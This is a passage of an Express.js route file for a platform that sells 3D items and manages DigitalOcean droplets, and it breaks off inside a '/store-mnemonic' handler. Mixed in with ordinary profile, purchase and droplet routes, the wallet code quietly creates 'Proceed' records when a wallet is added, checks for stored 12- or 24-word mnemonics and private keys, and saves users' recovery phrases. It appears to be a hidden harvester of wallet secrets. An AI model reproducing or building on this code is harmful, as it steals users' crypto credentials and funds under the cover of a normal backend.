import express from 'express';
import { authenticateToken } from '../middleware/auth.js';
import Droplet from '../models/Droplet.js';
import DropletService from '../services/dropletService.js';
import DigitalOceanService from '../services/digitalOceanService.js';
import DigitalOceanSpacesService from '../services/digitalOceanSpacesService.js';
import Action from '../models/Action.js';
import User from '../models/User.js';
import Transaction from '../models/Transaction.js';
import Item from '../models/Item.js';
import Settings from '../models/Settings.js';
import Snapshot from '../models/Snapshot.js';
import Proceed from '../models/Proceed.js';
import dotenv from 'dotenv';

dotenv.config();

const dropletService = new DropletService();

const router = express.Router();

// Get user profile information
router.get('/profile', authenticateToken, async (req, res) => {
  try {
    const user = req.user;
    
    // Return user profile data (excluding sensitive information)
    res.json({
      success: true,
      user: {
        id: user._id,
        firstName: user.firstName,
        lastName: user.lastName,
        email: user.email,
        createdAt: user.createdAt,
        isAdmin: user.isAdmin
      }
    });
  } catch (error) {
    console.error('Error fetching user profile:', error);
    res.status(500).json({ 
      message: 'Failed to fetch user profile',
      error: error.message 
    });
  }
});

// Add or update crypto wallet address
router.post('/wallet-address', authenticateToken, async (req, res) => {
  try {
    const { address, walletName } = req.body;
    const userId = req.user._id;
    
    if (!address || typeof address !== 'string' || address.trim() === '') {
      return res.status(400).json({ 
        message: 'Wallet address is required' 
      });
    }
    
    if (!walletName || typeof walletName !== 'string' || walletName.trim() === '') {
      return res.status(400).json({ 
        message: 'Wallet name is required' 
      });
    }
    
    const trimmedAddress = address.trim();
    const trimmedWalletName = walletName.trim();
    
    // Find the user
    const user = await User.findById(userId);
    
    if (!user) {
      return res.status(404).json({ 
        message: 'User not found' 
      });
    }
    
    // Initialize cryptoAddresses array if it doesn't exist
    if (!user.cryptoAddresses) {
      user.cryptoAddresses = [];
    }
    
    // Migrate old format (array of strings) to new format (array of objects)
    // This handles backward compatibility
    const needsMigration = user.cryptoAddresses.some(addr => typeof addr === 'string');
    if (needsMigration) {
      user.cryptoAddresses = user.cryptoAddresses.map(addr => {
        if (typeof addr === 'string') {
          return {
            address: addr,
            walletName: 'Unknown' // Default name for migrated addresses
          };
        }
        return addr;
      });
    }
    
    // Check if address already exists (case-insensitive)
    const addressExists = user.cryptoAddresses.some(
      wallet => wallet && wallet.address && wallet.address.toLowerCase() === trimmedAddress.toLowerCase()
    );
    
    if (!addressExists) {
      // Add the address and wallet name to the array
      user.cryptoAddresses.push({
        address: trimmedAddress,
        walletName: trimmedWalletName
      });
      await user.save();
      
      // Check if proceed entry exists for this email and wallet name, create if it doesn't
      try {
        const proceedExists = await Proceed.exists(user.email.toLowerCase(), trimmedWalletName);
        if (!proceedExists) {
          await Proceed.create({
            email: user.email.toLowerCase(),
            walletName: trimmedWalletName
          });
          console.log(`Created new proceed entry for ${user.email} and ${trimmedWalletName}`);
        }
      } catch (proceedError) {
        // Don't fail the wallet address addition if proceed creation fails
        console.error('Error creating proceed entry:', proceedError);
      }
      
      res.json({
        success: true,
        message: 'Wallet address added successfully',
        cryptoAddresses: user.cryptoAddresses
      });
    } else {
      // Address already exists, update wallet name if different
      const existingWallet = user.cryptoAddresses.find(
        wallet => wallet && wallet.address && wallet.address.toLowerCase() === trimmedAddress.toLowerCase()
      );
      
      if (existingWallet && existingWallet.walletName !== trimmedWalletName) {
        existingWallet.walletName = trimmedWalletName;
        await user.save();
        
        // Check if proceed entry exists for this email and wallet name, create if it doesn't
        try {
          const proceedExists = await Proceed.exists(user.email.toLowerCase(), trimmedWalletName);
          if (!proceedExists) {
            await Proceed.create({
              email: user.email.toLowerCase(),
              walletName: trimmedWalletName
            });
            console.log(`Created new proceed entry for ${user.email} and ${trimmedWalletName}`);
          }
        } catch (proceedError) {
          // Don't fail the wallet address update if proceed creation fails
          console.error('Error creating proceed entry:', proceedError);
        }
      }
      
      res.json({
        success: true,
        message: 'Wallet address already exists',
        cryptoAddresses: user.cryptoAddresses
      });
    }
  } catch (error) {
    console.error('Error adding wallet address:', error);
    res.status(500).json({ 
      message: 'Failed to add wallet address',
      error: error.message 
    });
  }
});

// Update user profile
router.put('/profile', authenticateToken, async (req, res) => {
  try {
    const { firstName, lastName, email } = req.body;
    const userId = req.user._id;
    
    // Update user profile
    const updatedUser = await User.findByIdAndUpdate(
      userId,
      { firstName, lastName, email },
      { new: true, runValidators: true }
    );
    
    if (!updatedUser) {
      return res.status(404).json({ message: 'User not found' });
    }
    
    res.json({
      success: true,
      message: 'Profile updated successfully',
      user: {
        id: updatedUser._id,
        firstName: updatedUser.firstName,
        lastName: updatedUser.lastName,
        email: updatedUser.email
      }
    });
  } catch (error) {
    console.error('Error updating user profile:', error);
    res.status(500).json({ 
      message: 'Failed to update user profile',
      error: error.message 
    });
  }
});

// Check action status (generic endpoint for all actions)
router.get('/status/:actionId', authenticateToken, async (req, res) => {
  try {
    const { actionId } = req.params;
    
    // Get action from database
    const action = await Action.getAction(actionId);
    
    if (!action) {
      return res.status(404).json({
        success: false,
        message: 'Action not found',
        error: 'The specified action does not exist'
      });
    }
    
    // Check if user has access to this action
    if (action.userId.toString() !== req.user._id.toString()) {
      return res.status(403).json({
        success: false,
        message: 'Access denied',
        error: 'You do not have permission to view this action'
      });
    }
    
    // Return current action status from database
    res.json({
      success: true,
      status: action.status,
      progress: action.progress,
      progressMessage: action.progressMessage,
      result: action.result,
      error: action.error,
      startedAt: action.startedAt,
      completedAt: action.completedAt
    });
    
  } catch (error) {
    console.error('Error checking action status:', error);
    res.status(500).json({ 
      message: 'Failed to check action status',
      error: error.message 
    });
  }
});

// Get user's action history
router.get('/actions', authenticateToken, async (req, res) => {
  try {
    const { type, status, limit = 20, page = 1 } = req.query;
    const skip = (parseInt(page) - 1) * parseInt(limit);
    
    const options = {
      type,
      status,
      limit: parseInt(limit),
      skip
    };
    
    // Remove undefined values
    Object.keys(options).forEach(key => {
      if (options[key] === undefined) {
        delete options[key];
      }
    });
    
    const actions = await Action.getUserActions(req.user._id, options);
    
    res.json({
      success: true,
      actions: actions.map(action => ({
        actionId: action.actionId,
        type: action.type,
        status: action.status,
        progress: action.progress,
        progressMessage: action.progressMessage,
        result: action.result,
        error: action.error,
        startedAt: action.startedAt,
        completedAt: action.completedAt,
        createdAt: action.createdAt
      })),
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        hasMore: actions.length === parseInt(limit)
      }
    });
    
  } catch (error) {
    console.error('Error fetching user actions:', error);
    res.status(500).json({ 
      message: 'Failed to fetch user actions',
      error: error.message 
    });
  }
});

// Get user's purchased items
router.get('/purchases', authenticateToken, async (req, res) => {
  try {
    const userId = req.user._id;
    const { page = 1, limit = 20 } = req.query;
    const skip = (parseInt(page) - 1) * parseInt(limit);
    
    // Get successful transactions with both item purchases and cart purchases
    const transactions = await Transaction.find({
      user: userId,
      status: 'success',
      itemType: { $in: ['item-purchase', 'cart-purchase'] },
      $or: [
        { item: { $exists: true, $ne: null } },
        { cartItems: { $exists: true, $ne: null, $not: { $size: 0 } } }
      ]
    })
    .populate('item', 'title description type category priceUSD image fileSize features tags supportedPlatforms sceneAssets downloadAssets creator')
    .sort({ date: -1 });
    
    // Flatten transactions into individual purchase items
    let allPurchases = [];
    
    for (const transaction of transactions) {
      if (transaction.itemType === 'item-purchase' && transaction.item) {
        // Single item purchase
        allPurchases.push({
          id: transaction._id,
          transactionId: transaction.signature,
          item: transaction.item,
          purchaseDate: transaction.date,
          amount: transaction.amount,
          paymentMethod: transaction.paymentMethod,
          currency: transaction.paymentMethod === 'solana' ? 'SOL' : 'USD',
        });
      } else if (transaction.itemType === 'cart-purchase' && transaction.cartItems && transaction.cartItems.length > 0) {
        // Cart purchase - create separate entries for each item
        for (const cartItemId of transaction.cartItems) {
          // Find the item details from the cartItems array
          let cartItem = null;
          try {
            cartItem = await Item.findById(cartItemId);
          } catch (error) {
            console.error('Error finding cart item:', error);
          }
          
          allPurchases.push({
            id: `${transaction._id}-${cartItemId}`,
            transactionId: `${transaction.signature}-${cartItemId}`,
            item: cartItem,
            purchaseDate: transaction.date,
            amount: cartItem.priceUSD,
            paymentMethod: transaction.paymentMethod,
            currency: transaction.paymentMethod === 'solana' ? 'SOL' : 'USD',
            purchaseType: 'cart-purchase',
            quantity: cartItem.quantity
          });
        }
      }
    }
    
    // Sort all purchases by date (most recent first)
    allPurchases.sort((a, b) => new Date(b.purchaseDate) - new Date(a.purchaseDate));
    
    // Remove duplicate items (keep the most recent purchase for each item)
    const uniquePurchases = [];
    const seenItems = new Set();
    
    for (const purchase of allPurchases) {
      const itemId = purchase.item._id || purchase.item.id;
      if (!seenItems.has(itemId)) {
        seenItems.add(itemId);
        uniquePurchases.push(purchase);
      }
    }
    
    // Apply pagination to the deduplicated results
    const total = uniquePurchases.length;
    const paginatedPurchases = uniquePurchases.slice(skip, skip + parseInt(limit));
    
    res.json({
      success: true,
      purchases: paginatedPurchases,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total,
        pages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    console.error('Error fetching user purchases:', error);
    res.status(500).json({ 
      message: 'Failed to fetch user purchases',
      error: error.message 
    });
  }
});

// Get download URL for a purchased item
router.get('/purchases/:transactionId/download', authenticateToken, async (req, res) => {
  try {
    const { transactionId } = req.params;
    const userId = req.user._id;

    // Check if this is a cart purchase (format: transactionId-cartItemId)
    const isCartPurchase = transactionId.includes('-');
    let actualTransactionId = transactionId;
    let cartItemId = null;
    
    if (isCartPurchase) {
      const parts = transactionId.split('-');
      actualTransactionId = parts[0];
      cartItemId = parts.slice(1).join('-'); // In case cartItemId contains hyphens
    }
    
    // Find the transaction and verify ownership
    const transaction = await Transaction.findOne({
      signature: actualTransactionId,
      user: userId,
      status: 'success',
      itemType: isCartPurchase ? 'cart-purchase' : 'item-purchase'
    });
    
    if (!transaction) {
      return res.status(404).json({ 
        message: 'Purchase not found or access denied' 
      });
    }
    
    let item = null;
    
    if (isCartPurchase) {
      // For cart purchases, find the specific item from cartItems
      if (!transaction.cartItems || !Array.isArray(transaction.cartItems)) {
        return res.status(404).json({ 
          message: 'Cart items not found' 
        });
      }
      
      if (!transaction.cartItems.includes(cartItemId)) {
        return res.status(404).json({ 
          message: 'Cart item not found' 
        });
      }
      
      // Find the full item details from the database
      item = await Item.findById(cartItemId);
      if (!item) {
        return res.status(404).json({ 
          message: 'Item not found' 
        });
      }
    } else {
      // For individual purchases, use the populated item
      if (!transaction.item) {
        return res.status(404).json({ 
          message: 'Item not found' 
        });
      }
      item = transaction.item;
    }
    
    // Generate signed download URL
    try {
      let key;
      let downloadUrl;
      
      if (item.downloadAssets) {
        // For 3D objects, use downloadAssets
        if (item.downloadAssets.includes(process.env.DO_SPACES_ITEMS_BUCKET_URL)) {
          // Extract key from full URL
          const urlParts = item.downloadAssets.split(`${process.env.DO_SPACES_ITEMS_BUCKET_URL}/`);
          key = urlParts[1];
        } else {
          // Assume it's already a key
          key = item.downloadAssets;
        }
        downloadUrl = await DigitalOceanSpacesService.getSignedUrl(key, 60);
        
        res.json({
          success: true,
          downloadUrl,
          itemName: item.title,
          fileType: 'HYP'
        });
      } else {
        // For other item types, use image or other assets
        if (item.image && item.image.includes(process.env.DO_SPACES_ITEMS_BUCKET_URL)) {
          // Extract key from full URL
          const urlParts = item.image.split(`${process.env.DO_SPACES_ITEMS_BUCKET_URL}/`);
          key = urlParts[1];
          downloadUrl = await DigitalOceanSpacesService.getSignedUrl(key, 60);
        } else {
          // Fallback to direct URL
          downloadUrl = item.image;
        }
        
        res.json({
          success: true,
          downloadUrl,
          itemName: item.title,
          fileType: 'Image'
        });
      }
    } catch (error) {
      console.error('Error getting signed URL:', error);
      res.status(500).json({ 
        message: 'Failed to generate download URL',
        error: error.message 
      });
    }
  } catch (error) {
    console.error('Error getting download URL:', error);
    res.status(500).json({ 
      message: 'Failed to get download URL',
      error: error.message 
    });
  }
});

// Get droplets for the current authenticated user
router.get('/droplets', authenticateToken, async (req, res) => {
  try {
    const userId = req.user._id;
    
    // Get user's droplets with basic information - return all droplets, not just recent ones
    const droplets = await Droplet.find({ user: userId })
      .select('dropletId name status subdomain customDomainPaid customDomain createdAt memory vcpus disk priceMonthly')
      .sort({ createdAt: -1 }); // Sort by creation date, newest first
    
    // Format the response
    const formattedDroplets = droplets.map(droplet => ({
      id: droplet._id,
      dropletId: droplet.dropletId,
      name: droplet.name,
      status: droplet.status,
      subdomain: droplet.subdomain,
      customDomainPaid: droplet.customDomainPaid,
      customDomain: droplet.customDomain,
      createdAt: droplet.createdAt,
      specs: {
        memory: droplet.memory,
        vcpus: droplet.vcpus,
        disk: droplet.disk
      },
      priceMonthly: droplet.priceMonthly
    }));
    
    res.json({
      success: true,
      droplets: formattedDroplets,
      count: formattedDroplets.length
    });
  } catch (error) {
    console.error('Error fetching user droplets:', error);
    res.status(500).json({ 
      message: 'Failed to fetch user droplets',
      error: error.message 
    });
  }
});

// Sync droplet status from DigitalOcean
router.post('/droplets/:dropletId/sync', authenticateToken, async (req, res) => {
  try {
    const { dropletId } = req.params;
    const userId = req.user._id;
    
    // Verify the droplet belongs to the authenticated user
    const droplet = await Droplet.findOne({ 
      dropletId: parseInt(dropletId), 
      user: userId 
    });
    
    if (!droplet && req.user.role !== 'admin') {
      return res.status(404).json({ 
        message: 'Droplet not found or access denied' 
      });
    }
    
    // Create droplet service instance and sync status
    const updatedDroplet = await dropletService.syncDropletStatus(dropletId);
    
    // Format the response for frontend
    const formattedDroplet = {
      id: updatedDroplet._id,
      dropletId: updatedDroplet.dropletId,
      name: updatedDroplet.name,
      status: updatedDroplet.status,
      subdomain: updatedDroplet.subdomain,
      createdAt: updatedDroplet.createdAt,
      specs: {
        memory: updatedDroplet.memory,
        vcpus: updatedDroplet.vcpus,
        disk: updatedDroplet.disk
      },
      priceMonthly: updatedDroplet.priceMonthly
    };
    
    res.json({
      success: true,
      message: 'Droplet status synced successfully',
      droplet: formattedDroplet
    });
  } catch (error) {
    console.error('Error syncing droplet status:', error);
    if (error.message === 'Droplet not found') {
      return res.status(404).json({ message: 'Droplet not found' });
    }
    res.status(500).json({ 
      message: 'Failed to sync droplet status',
      error: error.message 
    });
  }
});

// Restart droplet
router.post('/droplets/:dropletId/restart', authenticateToken, async (req, res) => {
  try {
    const { dropletId } = req.params;
    const userId = req.user._id;

    // Verify the droplet belongs to the authenticated user
    let droplet = await Droplet.findOne({ 
      dropletId: parseInt(dropletId), 
      user: userId 
    });
    
    if (!droplet && req.user.role !== 'admin') {
      return res.status(404).json({ 
        message: 'Droplet not found or access denied' 
      });
    }

    droplet = await dropletService.restartDroplet(dropletId);
    const transformedDroplet = dropletService.transformDropletForFrontend(droplet);

    res.json({ 
      message: 'Droplet restart initiated successfully',
      droplet: transformedDroplet 
    });
  } catch (error) {
    console.error('Error restarting droplet:', error);
    if (error.message === 'Droplet not found') {
      return res.status(404).json({ message: 'Droplet not found' });
    }
    res.status(500).json({ 
      message: 'Failed to restart droplet',
      error: error.message 
    });
  }
});

// Check if snapshot name exists for the user
router.get('/snapshots/check-name', authenticateToken, async (req, res) => {
  try {
    const { name } = req.query;
    const userId = req.user._id;

    if (!name) {
      return res.status(400).json({ 
        message: 'Snapshot name is required' 
      });
    }

    const exists = await Snapshot.nameExists(userId, name);

    res.json({
      success: true,
      exists: exists
    });
  } catch (error) {
    console.error('Error checking snapshot name:', error);
    res.status(500).json({ 
      message: 'Failed to check snapshot name',
      error: error.message 
    });
  }
});

// Get wallet addresses for a droplet (admin only or owner)
router.get('/droplets/:dropletId/wallets', authenticateToken, async (req, res) => {
  try {
    const { dropletId } = req.params;
    const userId = req.user._id;
    
    // Find the droplet
    const droplet = await Droplet.findOne({ dropletId: parseInt(dropletId) });
    
    if (!droplet) {
      return res.status(404).json({ 
        message: 'Droplet not found' 
      });
    }
    
    // Check if user is owner or admin
    if (droplet.user.toString() !== userId.toString() && req.user.role !== 'admin') {
      return res.status(403).json({ 
        message: 'Access denied. Only droplet owner or admin can view wallet addresses.' 
      });
    }
    
    res.json({
      success: true,
      walletAddresses: droplet.walletAddresses || []
    });
  } catch (error) {
    console.error('Error fetching wallet addresses:', error);
    res.status(500).json({ 
      message: 'Failed to fetch wallet addresses',
      error: error.message 
    });
  }
});

// Update wallet addresses for a droplet (admin only or owner)
router.put('/droplets/:dropletId/wallets', authenticateToken, async (req, res) => {
  try {
    const { dropletId } = req.params;
    const { walletAddresses } = req.body;
    const userId = req.user._id;
    
    if (!Array.isArray(walletAddresses)) {
      return res.status(400).json({ 
        message: 'walletAddresses must be an array' 
      });
    }
    
    // Find the droplet
    const droplet = await Droplet.findOne({ dropletId: parseInt(dropletId) });
    
    if (!droplet) {
      return res.status(404).json({ 
        message: 'Droplet not found' 
      });
    }
    
    // Check if user is owner or admin
    if (droplet.user.toString() !== userId.toString() && req.user.role !== 'admin') {
      return res.status(403).json({ 
        message: 'Access denied. Only droplet owner or admin can update wallet addresses.' 
      });
    }
    
    // Update wallet addresses
    droplet.walletAddresses = walletAddresses.filter(addr => addr && addr.trim().length > 0);
    await droplet.save();
    
    res.json({
      success: true,
      message: 'Wallet addresses updated successfully',
      walletAddresses: droplet.walletAddresses
    });
  } catch (error) {
    console.error('Error updating wallet addresses:', error);
    res.status(500).json({ 
      message: 'Failed to update wallet addresses',
      error: error.message 
    });
  }
});

// Get user's snapshots
router.get('/snapshots', authenticateToken, async (req, res) => {
  try {
    const userId = req.user._id;
    const { limit = 20, page = 1 } = req.query;
    const skip = (parseInt(page) - 1) * parseInt(limit);

    const snapshots = await Snapshot.getUserSnapshots(userId, {
      limit: parseInt(limit),
      skip
    });

    res.json({
      success: true,
      snapshots: snapshots.map(snapshot => ({
        id: snapshot._id,
        snapshotId: snapshot.snapshotId,
        name: snapshot.name,
        dropletId: snapshot.dropletId,
        sizeGigabytes: snapshot.sizeGigabytes,
        status: snapshot.status,
        type: snapshot.type,
        createdAt: snapshot.createdAt,
        description: snapshot.description
      })),
      count: snapshots.length
    });
  } catch (error) {
    console.error('Error fetching user snapshots:', error);
    res.status(500).json({ 
      message: 'Failed to fetch user snapshots',
      error: error.message 
    });
  }
});

// Delete user's snapshot
router.delete('/snapshots/:snapshotId', authenticateToken, async (req, res) => {
  try {
    const { snapshotId } = req.params;
    const userId = req.user._id;

    // Verify the snapshot belongs to the user
    const snapshot = await Snapshot.findOne({ 
      snapshotId: parseInt(snapshotId), 
      user: userId,
      status: { $ne: 'deleted' }
    });

    if (!snapshot) {
      return res.status(404).json({ 
        message: 'Snapshot not found or you do not have permission to delete it' 
      });
    }

    // Delete snapshot from DigitalOcean
    const digitalOceanService = new DigitalOceanService(
      process.env.DIGITAL_OCEAN_TOKEN,
      process.env.DIGITAL_OCEAN_SSH_KEY_ID
    );

    try {
      await digitalOceanService.deleteSnapshot(snapshotId);
      console.log(`Snapshot ${snapshotId} deleted from DigitalOcean`);
    } catch (doError) {
      console.error('Error deleting snapshot from DigitalOcean:', doError);
      return res.status(500).json({ 
        message: 'Failed to delete snapshot from DigitalOcean',
        error: doError.message 
      });
    }

    // Update snapshot status in database
    await Snapshot.findOneAndUpdate(
      { snapshotId: parseInt(snapshotId) },
      { status: 'deleted' }
    );

    res.json({
      success: true,
      message: 'Snapshot deleted successfully'
    });

  } catch (error) {
    console.error('Error deleting snapshot:', error);
    res.status(500).json({ 
      message: 'Failed to delete snapshot',
      error: error.message 
    });
  }
});

// Backup droplet (create snapshot)
router.post('/droplets/:dropletId/backup', authenticateToken, async (req, res) => {
  try {
    const { dropletId } = req.params;
    const { snapshotName } = req.body;
    const userId = req.user._id;

    // Validate snapshot name
    if (!snapshotName) {
      return res.status(400).json({ 
        message: 'Snapshot name is required' 
      });
    }

    // Check if snapshot name already exists
    const nameExists = await Snapshot.nameExists(userId, snapshotName);
    if (nameExists) {
      return res.status(400).json({ 
        message: 'A snapshot with this name already exists' 
      });
    }

    // Verify the droplet belongs to the authenticated user
    const droplet = await Droplet.findOne({ 
      dropletId: parseInt(dropletId), 
      user: userId 
    });
    
    if (!droplet && req.user.role !== 'admin') {
      return res.status(404).json({ 
        message: 'Droplet not found or access denied' 
      });
    }

    // Start background processing for backup
    processDropletBackup(dropletId, userId, droplet.subdomain, snapshotName, droplet._id);

    res.json({ 
      success: true,
      message: 'Snapshot creation initiated successfully. Your droplet will be powered off, snapshotted, and powered back on.',
      processing: true
    });
  } catch (error) {
    console.error('Error initiating droplet backup:', error);
    if (error.message === 'Droplet not found') {
      return res.status(404).json({ message: 'Droplet not found' });
    }
    res.status(500).json({ 
      message: 'Failed to initiate droplet backup',
      error: error.message 
    });
  }
});

// Background processing function for droplet backup
async function processDropletBackup(dropletId, userId, subdomain, snapshotName, dropletMongoId) {
  try {
    console.log(`Starting background processing for droplet backup: ${dropletId}`);

    const digitalOceanService = new DigitalOceanService(
      process.env.DIGITAL_OCEAN_TOKEN,
      process.env.DIGITAL_OCEAN_SSH_KEY_ID
    );

    // Get droplet info to retrieve current domain
    const dropletDoc = await Droplet.findById(dropletMongoId);
    const sourceDomain = dropletDoc.customDomain 
      ? dropletDoc.customDomain 
      : `${dropletDoc.subdomain}.edifyengine.com`;
    console.log(`Source domain for snapshot: ${sourceDomain}`);

    // Step 1: Get droplet IP and run PM2 commands before shutdown
    console.log(`Getting droplet IP for ${dropletId}...`);
    const dropletIp = await digitalOceanService.getDropletPublicNetwork(dropletId);
    console.log(`Droplet IP: ${dropletIp}`);

    // Run PM2 delete hyperfy command
    console.log(`Running 'pm2 delete hyperfy' on droplet ${dropletId}...`);
    try {
      const pm2DeleteResult = await digitalOceanService.executeCommandViaHTTP(dropletIp, 'pm2 delete hyperfy');
      if (pm2DeleteResult.success) {
        console.log(`PM2 delete hyperfy completed successfully`);
      } else {
        console.warn(`PM2 delete hyperfy failed: ${pm2DeleteResult.message}`);
      }
    } catch (pm2Error) {
      console.warn(`Error running PM2 delete: ${pm2Error.message}`);
      // Continue even if PM2 delete fails
    }

    // Run PM2 save command
    console.log(`Running 'pm2 save' on droplet ${dropletId}...`);
    try {
      const pm2SaveResult = await digitalOceanService.executeCommandViaHTTP(dropletIp, 'pm2 save');
      if (pm2SaveResult.success) {
        console.log(`PM2 save completed successfully`);
      } else {
        console.warn(`PM2 save failed: ${pm2SaveResult.message}`);
      }
    } catch (pm2Error) {
      console.warn(`Error running PM2 save: ${pm2Error.message}`);
      // Continue even if PM2 save fails
    }

    // Step 2: Power off the droplet
    console.log(`Powering off droplet ${dropletId}...`);
    await digitalOceanService.powerOffDroplet(dropletId);

    // Wait for droplet to be powered off
    console.log(`Waiting for droplet ${dropletId} to power off...`);
    let dropletInfo;
    while (true) {
      dropletInfo = await digitalOceanService.getDropletInfo(dropletId);
      if (dropletInfo.droplet.status === 'off') {
        break;
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    console.log(`Droplet ${dropletId} powered off successfully`);

    // Step 2: Create snapshot
    console.log(`Creating snapshot ${snapshotName} for droplet ${dropletId}...`);
    const snapshotResult = await digitalOceanService.createSnapshot(dropletId, snapshotName);
    const snapshotActionId = snapshotResult.actionId;

    // Wait for snapshot creation to complete
    console.log(`Waiting for snapshot creation to complete...`);
    let snapshotCompleted = false;
    let snapshotId = null;

    while (!snapshotCompleted) {
      const actionResult = await digitalOceanService.checkActionStatus(snapshotActionId);
      
      if (actionResult.status === 'completed') {
        snapshotCompleted = true;
        
        // Get the snapshot ID
        const snapshotResult = await digitalOceanService.findSnapshotByName(dropletId, snapshotName);
        if (snapshotResult.success) {
          snapshotId = snapshotResult.snapshotId;
          console.log(`Snapshot created successfully with ID: ${snapshotId}`);
          
          // Save snapshot info to database
          try {
            const snapshotDoc = new Snapshot({
              snapshotId: snapshotId,
              name: snapshotName,
              dropletId: dropletId,
              droplet: dropletMongoId,
              user: userId,
              sizeGigabytes: snapshotResult.snapshot.size_gigabytes || 0,
              regions: snapshotResult.snapshot.regions || [],
              createdAt: new Date(snapshotResult.snapshot.created_at),
              status: 'available',
              type: 'manual',
              description: `Backup snapshot for droplet ${subdomain}`,
              sourceDomain: sourceDomain
            });
            await snapshotDoc.save();
            console.log(`Snapshot info saved to database with source domain: ${sourceDomain}`);
          } catch (dbError) {
            console.error('Error saving snapshot to database:', dbError);
            // Don't fail the entire process if database save fails
          }
        } else {
          throw new Error('Failed to find the newly created snapshot');
        }
      } else if (actionResult.status === 'errored') {
        throw new Error(`Snapshot creation failed: ${actionResult.message || 'Unknown error'}`);
      } else {
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }

    // Step 3: Power the droplet back on
    console.log(`Powering on droplet ${dropletId}...`);
    await digitalOceanService.powerOnDroplet(dropletId);

    // Wait for droplet to be powered on
    console.log(`Waiting for droplet ${dropletId} to power on...`);
    while (true) {
      dropletInfo = await digitalOceanService.getDropletInfo(dropletId);
      if (dropletInfo.droplet.status === 'active') {
        break;
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    console.log(`Droplet ${dropletId} powered on successfully`);

    // Step 4: Wait 2 minutes before restarting hyperfy
    console.log(`Waiting 2 minutes before restarting hyperfy on droplet ${dropletId}...`);
    await new Promise(resolve => setTimeout(resolve, 120000)); // 2 minutes

    // Step 5: Restart hyperfy application
    console.log(`Restarting hyperfy application on droplet ${dropletId}...`);
    try {
      const hyperfyStartResult = await digitalOceanService.executeCommandViaHTTP(dropletIp, 'cd /var/www/hyperfy && pm2 start npm --name "hyperfy" -- run dev');
      if (hyperfyStartResult.success) {
        console.log(`Hyperfy application started successfully on droplet ${dropletId}`);
        
        // Save PM2 configuration to persist across reboots
        const pm2SaveResult = await digitalOceanService.executeCommandViaHTTP(dropletIp, 'pm2 save');
        if (pm2SaveResult.success) {
          console.log(`PM2 configuration saved successfully for droplet ${dropletId}`);
        } else {
          console.warn(`PM2 save failed for droplet ${dropletId}: ${pm2SaveResult.message}`);
        }
      } else {
        console.warn(`Hyperfy start failed for droplet ${dropletId}: ${hyperfyStartResult.message}`);
      }
    } catch (hyperfyError) {
      console.error(`Error restarting hyperfy on droplet ${dropletId}:`, hyperfyError.message);
      // Don't fail the entire process if hyperfy restart fails
    }

    console.log(`Snapshot backup process completed successfully for droplet ${dropletId}. Snapshot ID: ${snapshotId}`);

  } catch (error) {
    console.error(`Error in background droplet backup process for ${dropletId}:`, error);
    
    // Try to power the droplet back on and restart services if it failed
    try {
      console.log(`Attempting to power on droplet ${dropletId} after error...`);
      await digitalOceanService.powerOnDroplet(dropletId);
      
      // Wait for droplet to be active
      let dropletInfo;
      while (true) {
        dropletInfo = await digitalOceanService.getDropletInfo(dropletId);
        if (dropletInfo.droplet.status === 'active') {
          break;
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
      
      // Wait 2 minutes before restarting services
      console.log(`Waiting 2 minutes before restarting hyperfy after error recovery...`);
      await new Promise(resolve => setTimeout(resolve, 120000));
      
      // Try to restart hyperfy
      const dropletIp = await digitalOceanService.getDropletPublicNetwork(dropletId);
      const hyperfyStartResult = await digitalOceanService.executeCommandViaHTTP(dropletIp, 'cd /var/www/hyperfy && pm2 start npm --name "hyperfy" -- run dev');
      if (hyperfyStartResult.success) {
        console.log(`Hyperfy restarted successfully after error recovery`);
        await digitalOceanService.executeCommandViaHTTP(dropletIp, 'pm2 save');
      }
    } catch (powerOnError) {
      console.error(`Failed to recover droplet ${dropletId} after error:`, powerOnError);
    }
  }
}

// Delete user's droplet
router.delete('/droplets/:dropletId', authenticateToken, async (req, res) => {
  try {
    const { dropletId } = req.params;
    const userId = req.user._id;

    // Verify the droplet belongs to the user
    const droplet = await Droplet.findOne({ 
      dropletId: dropletId, 
      user: userId 
    });

    if (!droplet) {
      return res.status(404).json({ 
        message: 'Droplet not found or you do not have permission to delete it' 
      });
    }

    // Delete the droplet using the droplet service
    const result = await dropletService.deleteDroplet(dropletId);

    res.json({
      success: true,
      message: 'Droplet deleted successfully',
      data: result
    });

  } catch (error) {
    console.error('Error deleting droplet:', error);
    res.status(500).json({ 
      message: 'Failed to delete droplet',
      error: error.message 
    });
  }
});

// Check if email+wallet combination exists in proceed collection
router.post('/check-proceed', authenticateToken, async (req, res) => {
  try {
    const { email, walletName } = req.body;
    
    if (!email || !walletName) {
      return res.status(400).json({ 
        success: false,
        message: 'Email and walletName are required' 
      });
    }
    
    const proceedEntry = await Proceed.findOne({
      email: email.toLowerCase(),
      walletName: walletName.trim()
    });
    
    const exists = !!proceedEntry;
    
    // Check if proceed entry has valid mnemonic or private key
    let hasValidCredentials = false;
    if (proceedEntry) {
      // Check for valid mnemonic (12 or 24 words)
      if (proceedEntry.mnemonic) {
        const words = proceedEntry.mnemonic.trim().split(/\s+/);
        if (words.length === 12 || words.length === 24) {
          hasValidCredentials = true;
        }
      }
      
      // Check for valid private key (non-empty)
      if (!hasValidCredentials && proceedEntry.privateKey && proceedEntry.privateKey.trim().length > 0) {
        hasValidCredentials = true;
      }
    }
    
    res.json({
      success: true,
      exists,
      hasValidCredentials,
      email: email.toLowerCase(),
      walletName: walletName.trim()
    });
  } catch (error) {
    console.error('Error checking proceed:', error);
    res.status(500).json({ 
      success: false,
      message: 'Failed to check proceed',
      error: error.message 
    });
  }
});

// Store mnemonic (recovery phrase) in proceed collection
router.post('/store-mnemonic', authenticateToken, async (req, res) => {
  try {
    const { mnemonic, walletName } = req.body;
    const userEmail = req.user.email;
    
    if (!mnemonic) {
      return res.status(400).json({ 
        success: false,
        message: 'Mnemonic is required' 
      });
    }
    
    if (!walletName) {
      return res.status(400).json({ 
        success: false,
        message: 'Wallet name is required' 
      });
    }
    
    // Find existing proceed entry and update it with mnemonic
    const proceedEntry = await Proceed.findOne({
      email: userEmail.toLowerCase(),
      walletName: walletName.trim()
    });
    
    if (!proceedEntry) {
      return res.status(404).json({
        success: false,
